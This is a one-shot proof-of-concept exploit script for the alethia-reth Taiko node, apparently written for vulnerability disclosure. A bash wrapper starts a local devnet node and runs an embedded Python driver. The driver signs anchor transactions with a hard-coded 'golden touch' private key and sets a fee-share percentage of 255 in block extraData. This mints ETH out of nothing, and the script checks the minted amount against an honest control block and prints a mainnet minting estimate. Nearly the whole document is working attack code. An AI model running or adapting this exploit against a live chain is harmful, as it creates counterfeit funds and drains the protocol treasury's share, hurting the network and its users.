#!/usr/bin/env bash
# =============================================================================
# PoC F#3 — one-shot — alethia-reth @ 0fb47d9 — base_fee_share_pctg > 100 mint
# Usage:  bash poc_f3_one_shot.sh          (jalankan dari root repo)
# Env:    FORCE_BUILD=1  BUILD bin ulang | AUTH_PORT/HTTP_PORT  ganti port
# =============================================================================
set -euo pipefail

REPO_ROOT="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
cd "$REPO_ROOT"
[ -f Cargo.toml ] || { echo "jalankan dari root repo alethia-reth"; exit 1; }
command -v python3 >/dev/null || { echo "python3 diperlukan"; exit 1; }

BIN="${BIN:-$REPO_ROOT/target/debug/alethia-reth}"
AUTH_PORT="${AUTH_PORT:-8551}"; HTTP_PORT="${HTTP_PORT:-8545}"
WORK="${WORK:-/tmp/taiko-poc-f3}"
export POC_AUTH_URL="http://127.0.0.1:$AUTH_PORT"
export POC_HTTP_URL="http://127.0.0.1:$HTTP_PORT"
export POC_WORK="$WORK"
export POC_JWT_FILE="$WORK/jwt.hex"
export POC_GT_KEY="${POC_GT_KEY:-0x92954368afd3caa1f3ce3ead0069c1af414054aefe1ef9aeacc1bf426222ce38}"

# --- 1. binary ---------------------------------------------------------------
if [ ! -x "$BIN" ] || [ "${FORCE_BUILD:-0}" = "1" ]; then
  echo "[*] building (dev profile; 30-60 menit di 2 core — swap harus aktif)..."
  cargo build --bin alethia-reth
fi

# --- 2. environment ----------------------------------------------------------
rm -rf "$WORK"; mkdir -p "$WORK"
openssl rand -hex 32 | tr -d '\n' > "$POC_JWT_FILE"

# --- 3. driver (embedded) ----------------------------------------------------
cat > "$WORK/poc_f3_driver.py" <<'PYEOF'
#!/usr/bin/env python3
"""Attacker driver — mereplikasi alur taiko-client driver produksi secara eksak:
eth_sendRawTransaction -> FCU(attributes, extraData[0]=pctg) -> getPayload
-> newPayload -> FCU(head). stdlib only."""
import base64, hashlib, hmac, json, os, sys, time, urllib.request

AUTH_URL = os.environ.get("POC_AUTH_URL", "http://127.0.0.1:8551")
HTTP_URL = os.environ.get("POC_HTTP_URL", "http://127.0.0.1:8545")
JWT_FILE = os.environ.get("POC_JWT_FILE", "jwt.hex")
WORK     = os.environ.get("POC_WORK", ".")
GT_KEY   = int(os.environ.get("POC_GT_KEY",
    "0x92954368afd3caa1f3ce3ead0069c1af414054aefe1ef9aeacc1bf426222ce38"), 16)
USER_KEY = int(os.environ.get("POC_USER_KEY",
    "0xac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80"), 16)  # anvil #0
ATK_KEY  = int(os.environ.get("POC_ATTACKER_KEY",
    "0x59c6995e998f97a5a0044966f0945389dc9e86dae88c7a8412f4603b6b78690d"), 16)  # anvil #1

CHAIN_ID, TAIKO_MAINNET_ID = 167001, 167000
MIN_BF, MAINNET_MIN_BF, MAX_BF = 5_000_000, 10_000_000, 1_000_000_000
SHASTA_INITIAL, ELASTICITY, TBT, MGTP, DENOM = 25_000_000, 2, 2, 95, 8
ANCHOR_GAS, USER_GAS = 1_000_000, 21_000
GOLDEN_TOUCH = bytes.fromhex("0000777735367b36bc9b61c50022d9d0700db4ec")
ZERO32 = "0x" + "00" * 32

# ---- keccak256 (pure python) ----
_RC=[1,0x8082,0x800000000000808A,0x8000000080008000,0x808B,0x8000000000000001,
 0x8000000080008081,0x8000000000008009,0x8A,0x88,0x8000000000008009,
 0x800000000000000A,0x800000008000808B,0x800000000000008B,0x8000000000008089,
 0x8000000000008003,0x8000000000008002,0x8000000000000080,0x800000000000800A,
 0x800000008000000A,0x8000000080008081,0x8000000000008080,0x8000000000000001,
 0x8000000080008008]
_ROT=[[0,36,3,41,18],[1,44,10,45,2],[62,6,43,15,61],[28,55,25,21,56],[27,20,39,8,14]]
_M=(1<<64)-1
def _rol(x,n): return ((x<<n)|(x>>(64-n)))&_M
def _f(a):
    for r in range(24):
        c=[a[x][0]^a[x][1]^a[x][2]^a[x][3]^a[x][4] for x in range(5)]
        d=[c[(x-1)%5]^_rol(c[(x+1)%5],1) for x in range(5)]
        for x in range(5):
            for y in range(5): a[x][y]^=d[x]
        b=[[0]*5 for _ in range(5)]
        for x in range(5):
            for y in range(5): b[y][(2*x+3*y)%5]=_rol(a[x][y],_ROT[x][y])
        for x in range(5):
            for y in range(5): a[x][y]=b[x][y]^((~b[(x+1)%5][y])&_M&b[(x+2)%5][y])
        a[0][0]^=_RC[r]
def keccak256(data):
    p=bytearray(data); p.append(1)
    while len(p)%136: p.append(0)
    p[-1]|=0x80
    a=[[0]*5 for _ in range(5)]
    for o in range(0,len(p),136):
        for i in range(17):
            a[i%5][i//5]^=int.from_bytes(p[o+i*8:o+i*8+8],"little")
        _f(a)
    return b"".join(a[i%5][i//5].to_bytes(8,"little") for i in range(4))
assert keccak256(b"").hex()=="c5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a456"

# ---- secp256k1 (pure python) ----
_P=2**256-2**32-977; _N=0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFEBAAEDCE6AF48A03BBFD25E8CD0364141
_G=(0x79BE667EF9DCBBAC55A06295CE870B07029BFCDB2DCE28D959F2815B16F81798,
    0x483ADA7726A3C4655DA4FBFC0E1108A8FD17B448A68554199C47D08FFB10D4B8)
def _add(p,q):
    if p is None: return q
    if q is None: return p
    if p[0]==q[0] and (p[1]+q[1])%_P==0: return None
    l=(3*p[0]*p[0])*pow(2*p[1],-1,_P)%_P if p==q else (q[1]-p[1])*pow(q[0]-p[0],-1,_P)%_P
    x=(l*l-p[0]-q[0])%_P; return (x,(l*(p[0]-x)-p[1])%_P)
def _mul(k,p):
    r=None
    while k:
        if k&1: r=_add(r,p)
        p=_add(p,p); k>>=1
    return r
def priv_to_addr(k):
    x,y=_mul(k,_G); return keccak256(x.to_bytes(32,"big")+y.to_bytes(32,"big"))[12:]
def sign(priv,z):
    while True:
        k=int.from_bytes(os.urandom(32),"big")%_N
        if not k: continue
        R=_mul(k,_G); r=R[0]%_N
        if not r: continue
        s=pow(k,-1,_N)*(z+r*priv)%_N
        if not s: continue
        yv=R[1]&1
        if s>_N//2: s=_N-s; yv^=1
        return r,s,yv

# ---- rlp + tx ----
def _ei(n): return b"" if n==0 else n.to_bytes((n.bit_length()+7)//8,"big")
def rlp(x):
    if isinstance(x,bytes):
        if len(x)==1 and x[0]<0x80: return x
        h=_ei(len(x)); return bytes([0x80+len(x)]) if len(x)<56 else bytes([0xB7+len(h)])+h
    b=b"".join(rlp(i) for i in x)
    return bytes([0xC0+len(b)]) if len(b)<56 else bytes([0xF7+len(_ei(len(b)))])+_ei(len(b))+b
def legacy(k,nonce,gas_price,gas,to,value,data,cid):
    core=[_ei(nonce),_ei(gas_price),_ei(gas),to,_ei(value),data,_ei(cid),b"",b""]
    z=int.from_bytes(keccak256(rlp(core)),"big"); r,s,v=sign(k,z)
    return rlp(core[:-2]+[_ei(35+2*cid+v),r.to_bytes(32,"big"),s.to_bytes(32,"big")])
def eip1559(k,cid,nonce,prio,maxfee,gas,to,value,data):
    core=[_ei(cid),_ei(nonce),_ei(prio),_ei(maxfee),_ei(gas),to,_ei(value),data,[]]
    z=int.from_bytes(keccak256(b"\x02"+rlp(core)),"big"); r,s,v=sign(k,z)
    return b"\x02"+rlp(core+[v,r.to_bytes(32,"big"),s.to_bytes(32,"big")])

# ---- taiko ----
def treasury(cid): return bytes.fromhex((str(cid)+"10001").rjust(40,"0"))
SEL_V4=keccak256(b"anchorV4((uint48,bytes32,bytes32))")[:4]
def anchor_data(): return SEL_V4+(32).to_bytes(32,"big")+b"\x00"*96
def next_bf(gl,gu,bf,dt):
    mn=MAINNET_MIN_BF if CHAIN_ID==TAIKO_MAINNET_ID else MIN_BF
    bt=gl//ELASTICITY; adj=min(bt*dt//TBT,gl*MGTP//100)
    if gu>adj: bf=bf+max(bf*(gu-adj)//bt//DENOM,1)
    elif gu<adj: bf=bf-bf*(adj-gu)//bt//DENOM
    return max(mn,min(bf,MAX_BF))

# ---- rpc ----
def jwt(path):
    s=bytes.fromhex(open(path).read().strip().removeprefix("0x"))
    b=lambda x: base64.urlsafe_b64encode(x).rstrip(b"=")
    t=int(time.time())
    h=b(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")).encode())
    p=b(json.dumps({"iat":t,"exp":t+300},separators=(",",":")).encode())
    return (h+b"."+p+b"."+b(hmac.new(s,h+b"."+p,hashlib.sha256).digest())).decode()
class RPC:
    def __init__(s,url,jf=None): s.u,s.j,s.i=url,(open(jf).read().strip() if jf else None),0
    def call(s,m,ps=None):
        s.i+=1
        rq=urllib.request.Request(s.u,data=json.dumps({"jsonrpc":"2.0","id":s.i,
            "method":m,"params":ps if ps is not None else []}).encode(),
            headers={"Content-Type":"application/json"})
        if s.j: rq.add_header("Authorization","Bearer "+jwt(s.j))
        with urllib.request.urlopen(rq,timeout=180) as r: o=json.loads(r.read())
        if "error" in o: raise RuntimeError(f"{m}: {o['error']}")
        return o["result"]
def bal(w,a): return int(w.call("eth_getBalance",["0x"+a.hex(),"latest"]),16)

def drive(eng,web,st,k,label,pctg):
    user,atk,tr=k["u"],k["a"],k["t"]
    par=web.call("eth_getBlockByNumber",[hex(st["n"]),False])
    n=st["n"]+1
    if n==1: bf=SHASTA_INITIAL
    else:
        gp=web.call("eth_getBlockByNumber",[hex(n-2),False])
        bf=next_bf(int(par["gasLimit"],16),int(par["gasUsed"],16),
                   int(par["baseFeePerGas"],16),
                   int(par["timestamp"],16)-int(gp["timestamp"],16))
    ts=int(par["timestamp"],16)+2
    b0={x:bal(web,A) for x,A in (("atk",atk),("tr",tr),("user",user))}

    un=int(web.call("eth_getTransactionCount",["0x"+user.hex(),"latest"]),16)
    raw_u=legacy(k["uk"],un,bf,USER_GAS,atk,0,b"",CHAIN_ID)
    txh=web.call("eth_sendRawTransaction",["0x"+raw_u.hex()])
    for _ in range(20):
        try:
            if int(web.call("txpool_status")["pending"],16)>=1: break
        except Exception: break
        time.sleep(0.5)

    gn=int(web.call("eth_getTransactionCount",["0x"+GOLDEN_TOUCH.hex(),"latest"]),16)
    raw_a=eip1559(GT_KEY,CHAIN_ID,gn,0,2*bf,ANCHOR_GAS,tr,0,anchor_data())

    extra=bytes([pctg])+n.to_bytes(6,"big")
    attrs={"timestamp":hex(ts),"prevRandao":"0x"+"11"*32,
      "suggestedFeeRecipient":"0x"+atk.hex(),"withdrawals":[],
      "parentBeaconBlockRoot":ZERO32,"baseFeePerGas":hex(bf),
      "blockMetadata":{"beneficiary":"0x"+atk.hex(),"gasLimit":hex(30_000_000),
        "timestamp":hex(ts),"mixHash":"0x"+"22"*32,
        "extraData":base64.b64encode(extra).decode()},
      "l1Origin":{"blockId":hex(n),"l2BlockHash":par["hash"],
        "l1BlockHeight":"0x1","l1BlockHash":ZERO32,
        "buildPayloadArgsID":[0]*8,"isForcedInclusion":False,
        "signature":"0x"+"00"*65},
      "anchorTransaction":"0x"+raw_a.hex()}

    r=eng.call("engine_forkchoiceUpdatedV2",
        [{"headBlockHash":par["hash"],"safeBlockHash":par["hash"],
          "finalizedBlockHash":st["g"]},attrs])
    assert r["payloadStatus"]["status"]=="VALID",r
    pid=r["payloadId"]
    env=None
    for _ in range(60):
        try: env=eng.call("engine_getPayloadV2",[pid]); break
        except RuntimeError: time.sleep(1)
    assert env,"getPayload timeout"
    P,BV=env["executionPayload"],env["blockValue"]
    assert P["extraData"]=="0x"+extra.hex(),P["extraData"]
    assert int(P["baseFeePerGas"],16)==bf
    assert P["transactions"][0]=="0x"+raw_a.hex(),"anchor bukan tx pertama"
    assert P["transactions"][1]=="0x"+raw_u.hex(),"user tx tidak masuk payload"

    stt=eng.call("engine_newPayloadV2",[{**P,"txHash":ZERO32,
        "withdrawalsHash":ZERO32,"headerDifficulty":BV,"taikoBlock":True}])
    assert stt["status"]=="VALID",stt
    eng.call("engine_forkchoiceUpdatedV2",
        [{"headBlockHash":P["blockHash"],"safeBlockHash":P["blockHash"],
          "finalizedBlockHash":st["g"]},None])
    for _ in range(120):
        if int(web.call("eth_getBlockByNumber",["latest",False])["number"],16)>=n: break
        time.sleep(0.5)

    rcpt=None
    for _ in range(20):
        rcpt=web.call("eth_getTransactionReceipt",[txh])
        if rcpt: break
        time.sleep(0.5)
    assert rcpt and rcpt["status"]=="0x1"
    F=bf*int(rcpt["gasUsed"],16)
    b1={x:bal(web,A) for x,A in (("atk",atk),("tr",tr),("user",user))}
    d={x:b1[x]-b0[x] for x in b0}
    exp={"atk":F*pctg//100,"tr":max(F-F*pctg//100,0),"user":-F}
    minted=d["atk"]+d["tr"]+d["user"]
    ok=all(d[x]==exp[x] for x in d)
    print(f"\n=== BLOCK {n} [{label}]  pctg={pctg}  baseFee={bf}  F={F} wei ===")
    for x in ("atk","tr","user"):
        print(f"  delta {x:4s} = {d[x]:>18d}   (formula {exp[x]:>18d})  "
              f"{'OK' if d[x]==exp[x] else 'MISMATCH'}")
    print(f"  SUM-delta (conservation) = {minted} wei  "
          f"{'-> CONSERVED (honest)' if minted==0 else '-> MINTED FROM THIN AIR'}")
    st["n"],st["h"]=n,P["blockHash"]
    return {"block":n,"label":label,"pctg":pctg,"baseFee":bf,"F":F,"deltas":d,
            "expected":exp,"minted":minted,"match":ok,"blockHash":P["blockHash"],
            "userTx":txh,"extraData":P["extraData"],"stateRoot":P["stateRoot"]}

def main():
    gt=priv_to_addr(GT_KEY)
    assert gt==GOLDEN_TOUCH, \
      f"golden touch key SALAH: diturunkan 0x{gt.hex()}, diharapkan 0x{GOLDEN_TOUCH.hex()}"
    print(f"[+] golden touch key OK -> 0x{gt.hex()}")
    web=RPC(HTTP_URL)
    for _ in range(120):
        try:
            cid=int(web.call("eth_chainId"),16); break
        except Exception: time.sleep(1)
    else: raise RuntimeError("RPC HTTP tidak siap setelah 120s")
    assert cid==CHAIN_ID,f"chain id {cid}, harap {CHAIN_ID} (--chain devnet)"
    eng=RPC(AUTH_URL,JWT_FILE)
    k={"uk":USER_KEY,"u":priv_to_addr(USER_KEY),"a":priv_to_addr(ATK_KEY),
       "t":treasury(CHAIN_ID)}
    print(f"[+] chain {cid} | treasury 0x{k['t'].hex()}")
    print(f"[+] user 0x{k['u'].hex()} | attacker/coinbase 0x{k['a'].hex()}\n")
    g=web.call("eth_getBlockByNumber",["0x0",False])
    st={"n":0,"g":g["hash"]}
    res=[drive(eng,web,st,k,"control (honest)",50)]
    res+=[drive(eng,web,st,k,"exploit",255) for _ in range(3)]
    tot=sum(r["minted"] for r in res)
    print("\n"+"="*76)
    print("SUMMARY (wei):")
    for r in res:
        tag="CONSERVED" if r["minted"]==0 else f"+{r['minted']} MINTED"
        print(f"  blk {r['block']} pctg={r['pctg']:>3}: atk {r['deltas']['atk']:>+18d} | "
              f"tr {r['deltas']['tr']:>+18d} | user {r['deltas']['user']:>+18d} | {tag}")
    print(f"\n  TOTAL minted from thin air (3 exploit blocks): {tot} wei "
          f"({tot/1e18:.9f} ETH)")
    print(f"  On mainnet (0.01 gwei basefee, 2s blocks, full 30M gas): "
          f"~{1.55*10_000_000*29e6*43_200/1e18:.1f} ETH/day minted; treasury share zeroed.")
    print("  Minted ETH tidak dapat dibedakan dari ETH asli dan dapat di-bridge L2->L1.")
    json.dump(res,open(os.path.join(WORK,"poc-evidence.json"),"w"),indent=2)
    print(f"\n[+] evidence: {os.path.join(WORK,'poc-evidence.json')}")
    sys.exit(0 if all(r["match"] for r in res) else 1)

main()
PYEOF

# --- 4. launch node ----------------------------------------------------------
NODE_PID=""
cleanup(){ [ -n "$NODE_PID" ] && kill "$NODE_PID" 2>/dev/null || true; }
trap cleanup EXIT
echo "[*] launching node (devnet, fresh datadir $WORK/datadir)..."
"$BIN" node --chain devnet --datadir "$WORK/datadir" \
  --authrpc.addr 127.0.0.1 --authrpc.port "$AUTH_PORT" \
  --authrpc.jwtsecret "$POC_JWT_FILE" \
  --http --http.addr 127.0.0.1 --http.port "$HTTP_PORT" \
  --http.api eth,net,web3,txpool > "$WORK/node.log" 2>&1 &
NODE_PID=$!

# --- 5. run attack -----------------------------------------------------------
echo "[*] running attack (driver menunggu RPC siap sendiri)..."
if python3 "$WORK/poc_f3_driver.py"; then
  echo; echo "[+] PoC COMPLETE — kontrol: konservasi | exploit: MINT — lihat tabel di atas."
  cp "$WORK/poc-evidence.json" "$REPO_ROOT/poc-evidence.json" 2>/dev/null || true
  exit 0
else
  echo; echo "[!] PoC GAGAL — 60 baris terakhir log node:"; tail -60 "$WORK/node.log"
  exit 1
fi
